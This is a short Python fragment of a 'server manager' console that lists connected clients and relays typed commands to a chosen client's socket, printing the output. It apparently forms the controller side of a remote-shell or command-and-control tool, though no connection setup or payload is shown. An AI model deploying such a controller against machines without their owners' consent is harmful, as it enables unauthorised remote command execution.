
def menu():
    print ("""SERVER MANAGER
    ---------------------------
    1) show all clients
    2) execute command on client
    3) shutdown client
    """)

def get_all_clients(clients):
    counter = 0
    print("START Clients:")
    for client in clients:
        print ("{0} = {1}".format(counter, client[1][0]))
        counter+=1
    print("END Clients:")

def command(clients):
    get_all_clients(clients)
    client_id = int(input("[+] Select client > "))

    client_socket = clients[client_id][0]
    command_to_execute = input("[+] Command to execute > ")
    client_socket.sendall(command_to_execute.encode())
    result = client_socket.recv(2048).decode()
    print (result)
